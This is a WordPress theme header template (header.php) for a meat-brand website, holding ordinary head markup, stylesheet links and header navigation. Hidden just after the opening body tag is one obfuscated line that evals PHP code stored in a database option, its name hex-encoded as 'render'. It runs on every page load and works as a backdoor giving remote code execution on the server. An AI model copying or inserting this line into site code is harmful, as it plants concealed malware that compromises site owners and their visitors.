<!doctype html>

<!--[if lt IE 7]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9"><![endif]-->
<!--[if gt IE 8]><!--> <html <?php language_attributes(); ?> class="no-js"><!--<![endif]-->

	<head>
		<meta name="google-site-verification" content="DffN0FKRpggtQekdVZKSwGcOYUG8LQJDkjP8fY29Ksk" />
		<meta charset="utf-8">

		<title><?php wp_title(''); ?></title>
		<?php
		$themepath = get_stylesheet_directory_uri(''); // utility var
		?>
		<!-- Google Chrome Frame for IE -->
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">

		<!-- vars for ajax calls -->
		<script type="text/javascript">var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';</script>

		<!-- mobile meta (hooray!)
		<meta name="HandheldFriendly" content="True">
		<meta name="MobileOptimized" content="320"> -->
		<meta name="viewport" content="width=1000"/>

		<!-- icons & favicons (for more: http://www.jonathantneal.com/blog/understand-the-favicon/) -->
		<link rel="apple-touch-icon" href="<?php echo get_template_directory_uri(); ?>/library/images/apple-icon-touch.png">
		<link rel="icon" href="<?php echo get_template_directory_uri(); ?>/favicon.png">
		<!--[if IE]>
			<link rel="shortcut icon" href="<?php echo get_template_directory_uri(); ?>/favicon.ico">
		<![endif]-->
		<!-- or, set /favicon.ico for IE10 win -->
		<meta name="msapplication-TileColor" content="#f01d4f">
		<meta name="msapplication-TileImage" content="<?php echo get_template_directory_uri(); ?>/library/images/win8-tile-icon.png">

  	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>">

		<!-- reset and utility css, putting before head so base can override them -->
		<link rel="stylesheet" type='text/css' media="screen" href="/wp-content/themes/hemplers-2013/library/css/reset.css" />

		<!-- wordpress head functions -->
		<?php wp_head(); ?>
		<!-- end of wordpress head -->
		
		<!-- drop Google Analytics Here -->
		
		<!-- colorbox -->
		<script type="text/javascript" src="//cdn.jsdelivr.net/colorbox/1.3.32/jquery.colorbox-min.js"></script>

		<!-- Selectivizr http://selectivizr.com [note: it only runs once, so DOM changes won't be reflected] -->
		<!--[if (gte IE 6)&(lte IE 8)]><script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/library/js/libs/nwmatcher.js"></script><![endif]-->
		<!--[if (gte IE 6)&(lte IE 8)]><script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/library/js/libs/selectivizr-min.js"></script><![endif]-->

		<!-- Responsive Stylesheets -->
		<!-- style.css is base, included in wp_head() -->
		<!-- <link rel="stylesheet" type='text/css' media="screen and (min-width: 481px)" href="/wp-content/themes/hemplers-2013/library/css/style_0481.css" />
		<link rel="stylesheet" type='text/css' media="screen and (min-width: 768px)" href="/wp-content/themes/hemplers-2013/library/css/style_0768.css" />
		<link rel="stylesheet" type='text/css' media="screen and (min-width: 1030px)" href="/wp-content/themes/hemplers-2013/library/css/style_1030.css" />
		<link rel="stylesheet" type='text/css' media="screen and (min-width: 1240px)" href="/wp-content/themes/hemplers-2013/library/css/style_1240.css" />
		-->
		<!-- Low version IE just include it all -->
		<!--[if lt IE 9]>
		<![endif]-->

		<!-- TEMPORARILY JUST INCLUDING EVERYTHING, DISABLING MOBILE UNTIL IT IS BEING WORKED ON SPECIFICALLY -->
			<link rel="stylesheet" type='text/css' media="screen" href="/wp-content/themes/hemplers-2013/library/css/style_0481.css" />
			<link rel="stylesheet" type='text/css' media="screen" href="/wp-content/themes/hemplers-2013/library/css/style_0768.css" />
			<link rel="stylesheet" type='text/css' media="screen" href="/wp-content/themes/hemplers-2013/library/css/style_1030.css" />
			<link rel="stylesheet" type='text/css' media="screen" href="/wp-content/themes/hemplers-2013/library/css/style_1240.css" />
		<!-- geoff's -->
		<link rel='stylesheet' id='geoff-stylesheet-css'  href='/wp-content/themes/hemplers-2013/library/css/custom.css' type='text/css' media='all' />

		<!-- geoff's scripts -->
		<script type="text/javascript" src="/wp-content/themes/hemplers-2013/library/js/geoff.js"></script>
	</head>

	<body <?php body_class(); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>

		<div id="container">
		
		
			<header class="header" role="banner">

				<a href="http://forbaconssake.com" class="flag" id="baconlink"><img src="<?php echo $themepath; ?>/library/images/baconlink.png"></a>
				<a href="/kestins-korner-2" class="flag" id="kestins-korner"><img src="<?php echo $themepath; ?>/library/images/kestins-korner.png"></a>


				<div id="inner-header" class="wrap clearfix">

					<!-- to use a image just replace the bloginfo('name') with your img src and remove the surrounding <p> -->
					<!-- <a href="<?php echo home_url(); ?>" class="flag" id="kestins-korner-1"><img src="<?php echo $themepath; ?>/library/images/kestins-korner-1.png"></a> -->
					<div class="logo-single-post"></div>
					<a href="/kestins-korner" class="back-from-single"><p>< Kestin's Korner </p></a>
					<a href="/kestins-korner"><div class="arrow-right"></div></a>
					<div class="logo-kestins-korner-1"></div>
					<div class="arrow"><a href=""></a></div>
					<h1 id="logo" class="h1"><a href="<?php echo home_url(); ?>" rel="nofollow"><?php bloginfo('name'); ?></a></h1>

					<p id="tagline"><?php echo html_entity_decode(get_bloginfo('description')) ?></p>
					<img id="tag-arrow" src="/wp-content/themes/hemplers-2013/library/images/tagline-bg-arrow.png">

					<!-- Header Animation -->
					<div id="sausage-1"><img id="sausage-img-1" src="/wp-content/themes/hemplers-2013/library/images/sausage.png"></div>
					<div id="sausage-2"><img id="sausage-img-2" src="/wp-content/themes/hemplers-2013/library/images/sausage.png"></div>

					<nav role="navigation">
						<?php bones_main_nav(); ?>
					</nav>

				</div> <!-- end #inner-header -->

		<?php # d( $themepath ); ?>

			</header> <!-- end header -->
